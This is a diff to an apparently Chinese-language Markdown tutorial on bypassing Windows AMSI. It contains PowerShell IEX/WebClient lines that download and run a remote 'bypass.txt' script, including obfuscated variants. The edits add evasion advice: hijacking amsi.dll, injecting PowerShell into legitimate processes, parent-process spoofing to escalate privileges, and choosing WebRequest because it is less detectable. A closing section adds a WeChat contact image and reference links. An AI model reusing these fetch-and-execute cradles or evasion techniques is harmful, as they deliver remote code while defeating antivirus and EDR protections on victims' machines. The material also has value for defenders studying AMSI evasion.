@@ -198,7 +198,7 @@ IEX ((new-object net.webclient).downloadstring("http://10.@!#$%^&*()21@!#$%^&*()
 IEX([Net.Webclient]::new().DownloadString("http://0.0.0.0:8000/bypass.txt".))
 ```
 
-## 这个方法和方式二类似，本质上还是用webclient去连接服务端的方式进行通信
+## 这个方法和方式二类似，本质上还是用WebClient去连接服务端的方式去读取web端的样本内容
 
 ## 混淆后的样本为
 
@@ -209,7 +209,16 @@ IEX([Net.Webclient]::new().DownloadString("h%%%t%%%tp:%%%//10.212.2@@@@@02.188@@
 ![image](https://user-images.githubusercontent.com/89376703/155734999-eda34e45-42c7-4e2b-a526-c4eae7cb183f.png)
 
 # 绕过思路总结
-## 1.破坏反病毒的扫描进程或者劫持amsi.dll都可以有效地去绕过AMSI，其次，amsi.dll可以用WinDbg等软件进行调试，可用于逆向工程、反汇编和动态分析。在我们的例子中，WinDbg 将附加到运行 PowerShell 的进程，以分析 AMSI。
-## 2.使用IEX和webclient远程加载powershell进程，虽然方式比较简单，但是进程容易被杀死，cs执行高危操作会马上掉线。当进程被挂钩的同时，想绕过更多的防病毒软件和EDR会变得困难。
-## 3.0x02的记载方式显然比较稳定，比起webclient
+## 1.破坏反病毒的扫描进程或者劫持amsi.dll都可以有效地去绕过AMSI，其次，amsi.dll可以用WinDbg等软件进行调试，可用于逆向工程、反汇编和动态分析。在调试中，WinDbg 将附加到运行 PowerShell 的进程，以分析 AMSI。
+## 2.使用IEX和webclient远程加载powershell进程，虽然方式比较简单，但是进程容易被杀死，cs执行高危操作会马上掉线。当进程被挂钩的同时，想绕过更多的防病毒软件和EDR会变得困难。因此实战中红队人员通常会把PowerShell代码注入到合法的进程中，或者利用父进程欺骗去进一步完成高权限的提升
+## 3.0x02的加载方式显然比较稳定，比起webclient，WebRequest相对特征不那么明显，因此每种加载方式都有优劣之处
 
+# 微信联系
+
+![092085746420d71c94b43382d755b60](https://user-images.githubusercontent.com/89376703/155832064-cd2f60f1-51a7-402c-b957-8c8ca1568095.jpg)
+
+
+### 参考链接：
+https://blog.f-secure.com/hunting-for-amsi-bypasses/
+
+https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell
